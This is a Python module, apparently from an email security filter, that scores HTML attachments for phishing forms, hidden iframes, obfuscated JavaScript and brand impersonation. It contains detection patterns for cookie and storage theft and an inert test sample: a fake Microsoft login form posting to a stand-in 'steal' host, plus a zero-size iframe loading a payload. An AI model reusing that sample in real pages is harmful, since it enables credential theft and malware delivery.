#!/usr/bin/env python3
"""
HTML Attachment Analysis Module for OpenEFA Email Security
Detects phishing, credential theft, and malware delivery via HTML file attachments

CAPABILITIES:
- URI extraction from all HTML elements (links, forms, iframes, scripts)
- Credential theft form detection
- Hidden iframe detection (malware droppers)
- JavaScript obfuscation analysis
- Tracking pixel detection
- Brand impersonation detection
- Risk scoring and threat classification

IMPORTANT: This analyzes .html/.htm FILE ATTACHMENTS, not the email body HTML
NOTE: Uses "URI" (not "URL") to match ClamAV 1.5 and industry standards
"""

import re
import logging
from typing import Dict, List, Tuple, Optional, Any
from email.message import EmailMessage
import json
from urllib.parse import urlparse

# HTML parsing imports
try:
    from bs4 import BeautifulSoup
    import lxml
    HTML_ANALYSIS_AVAILABLE = True
except ImportError as e:
    HTML_ANALYSIS_AVAILABLE = False
    print(f"HTML analysis libraries not available: {e}")
    print("Install with: pip install beautifulsoup4 lxml")


class HTMLAttachmentAnalyzer:
    """
    Analyzes HTML file attachments for phishing and malware threats:
    - Credential theft forms (fake login pages)
    - Hidden iframes (malware droppers)
    - Malicious redirects and JavaScript
    - Tracking pixels and reconnaissance
    - Brand impersonation
    """

    def __init__(self):
        self.logger = logging.getLogger('html_analyzer')

        # Suspicious file extensions that shouldn't be downloaded from HTML
        self.malware_extensions = [
            '.exe', '.scr', '.bat', '.cmd', '.com', '.pif', '.vbs',
            '.js', '.jar', '.msi', '.dll', '.ps1', '.app', '.deb', '.rpm'
        ]

        # URL shorteners and free hosting services
        self.suspicious_services = [
            'bit.ly', 'tinyurl.com', 't.co', 'goo.gl', 'short.link',
            'rebrand.ly', 'ow.ly', 'buff.ly', 'adf.ly',
            '.tk', '.ml', '.ga', '.cf', '.gq',  # Free domains
            '000webhost', 'weebly.com', 'wix.com', 'blogspot.com'
        ]

        # Brand names commonly impersonated
        self.impersonated_brands = {
            'microsoft': [
                'microsoft', 'office', 'o365', 'office365', 'outlook',
                'onedrive', 'sharepoint', 'teams', 'azure', 'live.com'
            ],
            'google': [
                'google', 'gmail', 'drive', 'docs', 'workspace'
            ],
            'apple': [
                'apple', 'icloud', 'itunes', 'app store', 'apple id'
            ],
            'paypal': [
                'paypal', 'pay pal'
            ],
            'banking': [
                'chase', 'bank of america', 'wells fargo', 'citibank',
                'us bank', 'capital one', 'discover'
            ],
            'docusign': [
                'docusign', 'document sign', 'e-signature', 'digital signature'
            ],
            'amazon': [
                'amazon', 'aws', 'prime'
            ]
        }

        # Credential theft indicators
        self.credential_keywords = [
            'password', 'passwd', 'pwd', 'pass',
            'username', 'user', 'email', 'login',
            'signin', 'sign-in', 'account',
            'verify', 'confirm', 'authenticate'
        ]

        # Urgency/pressure tactics
        self.urgency_phrases = [
            r'account\s+(?:suspended|locked|blocked|disabled)',
            r'verify\s+(?:immediately|now|asap|urgently)',
            r'(?:urgent|immediate|critical)\s+(?:action|attention)',
            r'(?:expire|expires|expiring)\s+(?:soon|today|tonight)',
            r'unauthorized\s+(?:access|activity|transaction)',
            r'suspicious\s+(?:activity|login|transaction)',
            r'security\s+(?:alert|warning|threat)',
            r'click\s+(?:here|now|immediately)',
            r'act\s+now',
            r'limited\s+time'
        ]

    def analyze_html_attachment(self, html_data: bytes, filename: str = '') -> Dict[str, Any]:
        """
        Main analysis function for HTML file attachments
        Returns comprehensive threat assessment
        """
        if not HTML_ANALYSIS_AVAILABLE:
            return {
                'analysis_available': False,
                'error': 'HTML analysis libraries not installed (beautifulsoup4, lxml)'
            }

        results = {
            'filename': filename,
            'analysis_available': True,
            'file_size': len(html_data),
            'threats_detected': [],
            'risk_score': 0.0,
            'uris_found': [],              # Changed from 'urls_found' to match ClamAV
            'suspicious_uris': [],         # Changed from 'suspicious_urls' to match ClamAV
            'forms_detected': [],
            'hidden_elements': [],
            'javascript_threats': [],
            'brand_impersonation': [],
            'urgency_tactics': []
        }

        try:
            # Decode HTML
            html_text = html_data.decode('utf-8', errors='ignore')

            # Parse HTML
            soup = BeautifulSoup(html_text, 'lxml')

            # Extract and analyze URIs
            uri_analysis = self._extract_and_analyze_uris(soup, html_text)
            results['uris_found'] = uri_analysis['all_uris']
            results['suspicious_uris'] = uri_analysis['suspicious_uris']

            # Detect credential theft forms
            form_analysis = self._analyze_forms(soup)
            results['forms_detected'] = form_analysis['forms']

            # Detect hidden elements (iframes, images, scripts)
            hidden_analysis = self._detect_hidden_elements(soup)
            results['hidden_elements'] = hidden_analysis['hidden_elements']

            # Analyze JavaScript for threats
            js_analysis = self._analyze_javascript(soup, html_text)
            results['javascript_threats'] = js_analysis['threats']

            # Detect brand impersonation
            brand_analysis = self._detect_brand_impersonation(html_text, soup)
            results['brand_impersonation'] = brand_analysis['brands']

            # Detect urgency/pressure tactics
            urgency_analysis = self._detect_urgency_tactics(html_text)
            results['urgency_tactics'] = urgency_analysis['tactics']

            # Calculate overall risk score
            risk_score = self._calculate_risk_score(results)
            results['risk_score'] = risk_score

            # Generate threat summary
            threats = self._generate_threat_summary(results)
            results['threats_detected'] = threats

            self.logger.info(f"HTML analysis complete: {filename}, risk_score={risk_score}")

        except Exception as e:
            self.logger.error(f"HTML analysis failed for {filename}: {e}")
            results['error'] = str(e)
            results['analysis_available'] = False

        return results

    def _extract_and_analyze_uris(self, soup: BeautifulSoup, html_text: str) -> Dict[str, Any]:
        """Extract URIs from all possible sources and analyze them"""
        all_uris = []
        suspicious_uris = []

        # 1. Extract from <a> tags
        for link in soup.find_all('a', href=True):
            uri = link['href']
            all_uris.append(uri)

        # 2. Extract from <form> actions
        for form in soup.find_all('form', action=True):
            uri = form['action']
            all_uris.append(uri)

        # 3. Extract from <img> src (tracking pixels, malicious images)
        for img in soup.find_all('img', src=True):
            uri = img['src']
            all_uris.append(uri)

        # 4. Extract from <iframe> src (malware droppers)
        for iframe in soup.find_all('iframe', src=True):
            uri = iframe['src']
            all_uris.append(uri)

        # 5. Extract from <script> src
        for script in soup.find_all('script', src=True):
            uri = script['src']
            all_uris.append(uri)

        # 6. Extract from JavaScript redirects
        js_uri_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
            r'window\.open\s*\(["\']([^"\']+)["\']',
        ]
        for pattern in js_uri_patterns:
            matches = re.findall(pattern, html_text, re.IGNORECASE)
            all_uris.extend(matches)

        # 7. Extract from meta refresh
        for meta in soup.find_all('meta', attrs={'http-equiv': 'refresh'}):
            content = meta.get('content', '')
            match = re.search(r'url=([^\s;]+)', content, re.IGNORECASE)
            if match:
                all_uris.append(match.group(1))

        # Remove duplicates
        all_uris = list(set(all_uris))

        # Analyze each URI for threats
        for uri in all_uris:
            analysis = self._analyze_uri_threat(uri)
            if analysis['is_suspicious']:
                suspicious_uris.append(analysis)

        return {
            'all_uris': all_uris,
            'suspicious_uris': suspicious_uris
        }

    def _analyze_uri_threat(self, uri: str) -> Dict[str, Any]:
        """Analyze individual URI for threat indicators"""
        uri_lower = uri.lower()
        is_suspicious = False
        reasons = []
        risk_level = 'low'

        try:
            parsed = urlparse(uri)
            domain = parsed.netloc.lower()
            path = parsed.path.lower()

            # Check for malware file downloads
            for ext in self.malware_extensions:
                if path.endswith(ext):
                    is_suspicious = True
                    reasons.append(f"Downloads executable file: {ext}")
                    risk_level = 'critical'

            # Check for suspicious services
            for service in self.suspicious_services:
                if service in domain:
                    is_suspicious = True
                    reasons.append(f"Uses suspicious service: {service}")
                    risk_level = 'high' if risk_level != 'critical' else risk_level

            # Check for IP address instead of domain
            if re.match(r'^https?://\d+\.\d+\.\d+\.\d+', uri):
                is_suspicious = True
                reasons.append("Uses IP address instead of domain name")
                risk_level = 'high' if risk_level != 'critical' else risk_level

            # Check for non-HTTPS login/form submissions
            if not uri.startswith('https://') and any(term in uri_lower for term in ['login', 'signin', 'password', 'account']):
                is_suspicious = True
                reasons.append("Non-HTTPS URI for sensitive operation")
                risk_level = 'high' if risk_level != 'critical' else risk_level

            # Check for typosquatting indicators
            typosquat_patterns = [
                r'micros[o0]ft', r'g[o0]{2}gle', r'paypa[l1]', r'app[l1]e',
                r'amaz[o0]n', r'chase-', r'-chase', r'citibank-', r'-login',
                r'secure-.*-login', r'verify-.*account'
            ]
            for pattern in typosquat_patterns:
                if re.search(pattern, domain):
                    is_suspicious = True
                    reasons.append(f"Possible typosquatting: {domain}")
                    risk_level = 'high' if risk_level != 'critical' else risk_level

            # Check for data exfiltration in URI parameters
            if len(uri) > 500:
                is_suspicious = True
                reasons.append("Unusually long URI (possible data exfiltration)")
                risk_level = 'medium' if risk_level == 'low' else risk_level

        except Exception as e:
            self.logger.debug(f"Error analyzing URI {uri}: {e}")

        return {
            'uri': uri,
            'is_suspicious': is_suspicious,
            'reasons': reasons,
            'risk_level': risk_level
        }

    def _analyze_forms(self, soup: BeautifulSoup) -> Dict[str, Any]:
        """Detect credential theft and phishing forms"""
        forms = []

        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').upper(),
                'has_password_field': False,
                'has_email_field': False,
                'has_username_field': False,
                'is_credential_theft': False,
                'risk_level': 'low',
                'reasons': []
            }

            # Analyze form inputs
            inputs = form.find_all('input')
            for inp in inputs:
                input_type = inp.get('type', '').lower()
                input_name = inp.get('name', '').lower()

                if input_type == 'password':
                    form_data['has_password_field'] = True

                if input_type == 'email' or any(term in input_name for term in ['email', 'mail']):
                    form_data['has_email_field'] = True

                if any(term in input_name for term in ['user', 'username', 'login']):
                    form_data['has_username_field'] = True

            # Determine if this is a credential theft form
            if form_data['has_password_field'] and (form_data['has_email_field'] or form_data['has_username_field']):
                form_data['is_credential_theft'] = True
                form_data['reasons'].append("Contains password + email/username fields")

                # Check form action URL
                action = form_data['action'].lower()

                if not action.startswith('https://'):
                    form_data['reasons'].append("Form submits over non-HTTPS")
                    form_data['risk_level'] = 'critical'
                elif any(service in action for service in self.suspicious_services):
                    form_data['reasons'].append("Form submits to suspicious domain")
                    form_data['risk_level'] = 'critical'
                else:
                    form_data['risk_level'] = 'high'

            if form_data['is_credential_theft'] or form_data['action']:
                forms.append(form_data)

        return {'forms': forms}

    def _detect_hidden_elements(self, soup: BeautifulSoup) -> Dict[str, Any]:
        """Detect hidden iframes, images, and other elements used for attacks"""
        hidden_elements = []

        # Check iframes
        for iframe in soup.find_all('iframe'):
            style = iframe.get('style', '').lower()
            width = iframe.get('width', '100')
            height = iframe.get('height', '100')
            src = iframe.get('src', '')

            is_hidden = (
                'display:none' in style or 'display: none' in style or
                'visibility:hidden' in style or 'visibility: hidden' in style or
                width in ['0', '1'] or height in ['0', '1']
            )

            if is_hidden and src:
                hidden_elements.append({
                    'type': 'iframe',
                    'src': src,
                    'reason': 'Hidden iframe (often loads malware)',
                    'risk_level': 'critical'
                })

        # Check tracking pixels (1x1 images)
        for img in soup.find_all('img'):
            width = img.get('width', '100')
            height = img.get('height', '100')
            src = img.get('src', '')

            if (width == '1' and height == '1') or (width == '0' and height == '0'):
                hidden_elements.append({
                    'type': 'tracking_pixel',
                    'src': src,
                    'reason': 'Tracking pixel (reconnaissance)',
                    'risk_level': 'medium'
                })

        # Check hidden divs with external content
        for div in soup.find_all('div'):
            style = div.get('style', '').lower()
            if 'display:none' in style or 'display: none' in style:
                # Check if div contains scripts or iframes
                if div.find_all(['script', 'iframe']):
                    hidden_elements.append({
                        'type': 'hidden_div',
                        'reason': 'Hidden div containing scripts/iframes',
                        'risk_level': 'high'
                    })

        return {'hidden_elements': hidden_elements}

    def _analyze_javascript(self, soup: BeautifulSoup, html_text: str) -> Dict[str, Any]:
        """Analyze JavaScript for malicious behavior"""
        threats = []

        # Get all script content
        scripts = []
        for script in soup.find_all('script'):
            if script.string:
                scripts.append(script.string)

        all_js = ' '.join(scripts) + ' ' + html_text

        # Check for obfuscation
        if re.search(r'eval\s*\(', all_js, re.IGNORECASE):
            threats.append({
                'threat': 'eval() usage',
                'reason': 'JavaScript eval() can execute obfuscated code',
                'risk_level': 'high'
            })

        if re.search(r'fromCharCode', all_js, re.IGNORECASE):
            threats.append({
                'threat': 'String.fromCharCode obfuscation',
                'reason': 'Character encoding often used to hide malicious code',
                'risk_level': 'high'
            })

        # Check for automatic redirects
        redirect_patterns = [
            r'window\.location\s*=',
            r'window\.location\.href\s*=',
            r'location\.replace\s*\(',
            r'window\.location\.replace\s*\('
        ]
        for pattern in redirect_patterns:
            if re.search(pattern, all_js, re.IGNORECASE):
                threats.append({
                    'threat': 'Automatic redirect',
                    'reason': 'JavaScript redirects user to another site',
                    'risk_level': 'medium'
                })
                break

        # Check for data exfiltration
        exfil_patterns = [
            r'document\.cookie',
            r'localStorage\.getItem',
            r'sessionStorage\.getItem',
            r'navigator\.userAgent',
            r'fetch\s*\(',
            r'XMLHttpRequest'
        ]
        for pattern in exfil_patterns:
            if re.search(pattern, all_js, re.IGNORECASE):
                threats.append({
                    'threat': 'Data collection',
                    'reason': f'JavaScript accesses {pattern} (possible data theft)',
                    'risk_level': 'high'
                })
                break

        return {'threats': threats}

    def _detect_brand_impersonation(self, html_text: str, soup: BeautifulSoup) -> Dict[str, Any]:
        """Detect brand impersonation attempts"""
        brands_detected = []
        html_lower = html_text.lower()

        # Get page title
        title = soup.find('title')
        title_text = title.string.lower() if title and title.string else ''

        for brand, keywords in self.impersonated_brands.items():
            mentions = 0
            found_keywords = []

            for keyword in keywords:
                count = html_lower.count(keyword)
                if count > 0:
                    mentions += count
                    found_keywords.append(keyword)

            if mentions > 0:
                # Check if legitimate domain is present
                legitimate_domain_present = False
                if brand == 'microsoft' and 'microsoft.com' in html_lower:
                    legitimate_domain_present = True
                elif brand == 'google' and 'google.com' in html_lower:
                    legitimate_domain_present = True
                elif brand == 'apple' and 'apple.com' in html_lower:
                    legitimate_domain_present = True
                elif brand == 'paypal' and 'paypal.com' in html_lower:
                    legitimate_domain_present = True

                brands_detected.append({
                    'brand': brand,
                    'mentions': mentions,
                    'keywords_found': found_keywords,
                    'in_title': any(kw in title_text for kw in found_keywords),
                    'legitimate_domain_present': legitimate_domain_present,
                    'confidence': min(mentions * 0.15, 1.0)
                })

        return {'brands': brands_detected}

    def _detect_urgency_tactics(self, html_text: str) -> Dict[str, Any]:
        """Detect urgency and pressure tactics common in phishing"""
        tactics = []
        html_lower = html_text.lower()

        for pattern in self.urgency_phrases:
            matches = re.finditer(pattern, html_lower, re.IGNORECASE)
            for match in matches:
                tactics.append({
                    'phrase': match.group(0),
                    'context': html_text[max(0, match.start()-40):match.end()+40]
                })

        return {'tactics': tactics}

    def _calculate_risk_score(self, results: Dict[str, Any]) -> float:
        """Calculate overall risk score (0-10)"""
        risk_score = 0.0

        # Credential theft forms
        critical_forms = [f for f in results['forms_detected'] if f['is_credential_theft']]
        risk_score += len(critical_forms) * 3.0

        # Suspicious URIs
        for uri in results['suspicious_uris']:
            if uri['risk_level'] == 'critical':
                risk_score += 2.5
            elif uri['risk_level'] == 'high':
                risk_score += 1.5
            elif uri['risk_level'] == 'medium':
                risk_score += 0.5

        # Hidden elements
        for element in results['hidden_elements']:
            if element['risk_level'] == 'critical':
                risk_score += 2.0
            elif element['risk_level'] == 'high':
                risk_score += 1.0

        # JavaScript threats
        risk_score += len(results['javascript_threats']) * 1.0

        # Brand impersonation without legitimate domain
        fake_brands = [b for b in results['brand_impersonation'] if not b['legitimate_domain_present']]
        risk_score += len(fake_brands) * 1.5

        # Urgency tactics
        risk_score += min(len(results['urgency_tactics']) * 0.5, 2.0)

        return min(risk_score, 10.0)

    def _generate_threat_summary(self, results: Dict[str, Any]) -> List[str]:
        """Generate list of detected threats"""
        threats = []

        if any(f['is_credential_theft'] for f in results['forms_detected']):
            threats.append('CREDENTIAL_THEFT_FORM')

        if any(e['type'] == 'iframe' for e in results['hidden_elements']):
            threats.append('HIDDEN_IFRAME')

        if any(u['risk_level'] == 'critical' for u in results['suspicious_uris']):
            threats.append('MALWARE_DOWNLOAD_LINK')

        if results['javascript_threats']:
            threats.append('MALICIOUS_JAVASCRIPT')

        if any(e['type'] == 'tracking_pixel' for e in results['hidden_elements']):
            threats.append('TRACKING_PIXEL')

        if results['brand_impersonation']:
            threats.append('BRAND_IMPERSONATION')

        if results['urgency_tactics']:
            threats.append('URGENCY_TACTICS')

        if results['risk_score'] >= 7.0:
            threats.append('HIGH_RISK_HTML')

        return threats


# Integration function for email_filter.py
def analyze_html_attachments(msg: EmailMessage) -> Dict[str, Any]:
    """
    Analyze all HTML file attachments in email message
    Returns comprehensive threat assessment

    IMPORTANT: Only analyzes HTML FILE ATTACHMENTS, not email body HTML
    """
    analyzer = HTMLAttachmentAnalyzer()
    attachment_results = []
    overall_risk = 0.0
    all_threats = set()

    try:
        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                filename = part.get_filename()
                disposition = part.get('Content-Disposition', '')

                # Check if this is an HTML FILE ATTACHMENT (not email body)
                if content_type == 'text/html' and (filename or 'attachment' in disposition):
                    if not filename:
                        filename = 'unknown.html'

                    attachment_data = part.get_payload(decode=True)

                    if attachment_data:
                        result = analyzer.analyze_html_attachment(attachment_data, filename)
                        attachment_results.append(result)

                        if result.get('analysis_available'):
                            overall_risk = max(overall_risk, result['risk_score'])
                            all_threats.update(result['threats_detected'])

    except Exception as e:
        return {
            'analysis_available': False,
            'error': str(e)
        }

    return {
        'analysis_available': True,
        'attachment_count': len(attachment_results),
        'attachments': attachment_results,
        'overall_risk_score': overall_risk,
        'all_threats': list(all_threats),
        'html_spam_score': overall_risk * 10,  # Convert to spam score (0-100)
        'requires_blocking': overall_risk >= 7.0
    }


if __name__ == "__main__":
    # Test the HTML analyzer
    print("HTML Attachment Analyzer initialized")
    print(f"HTML analysis available: {HTML_ANALYSIS_AVAILABLE}")

    if HTML_ANALYSIS_AVAILABLE:
        # Test with sample phishing HTML
        test_html = b"""
        <html>
        <head><title>Microsoft Account Verification</title></head>
        <body>
            <h1>Verify Your Account</h1>
            <p>Your account has been suspended. Click immediately to verify!</p>
            <form action="http://phishing-site.tk/steal" method="POST">
                <input type="email" name="email" placeholder="Email">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Sign In</button>
            </form>
            <iframe src="http://malware.net/payload.html" width="0" height="0"></iframe>
        </body>
        </html>
        """

        analyzer = HTMLAttachmentAnalyzer()
        result = analyzer.analyze_html_attachment(test_html, 'test_phishing.html')

        print("\n=== Test Analysis Results ===")
        print(f"Risk Score: {result['risk_score']}/10")
        print(f"Threats: {result['threats_detected']}")
        print(f"URIs Found: {len(result['uris_found'])}")
        print(f"Suspicious URIs: {len(result['suspicious_uris'])}")
        print(f"Credential Forms: {len([f for f in result['forms_detected'] if f['is_credential_theft']])}")
        print(f"Hidden Elements: {len(result['hidden_elements'])}")
    else:
        print("\nInstall required libraries:")
        print("  pip install beautifulsoup4 lxml")
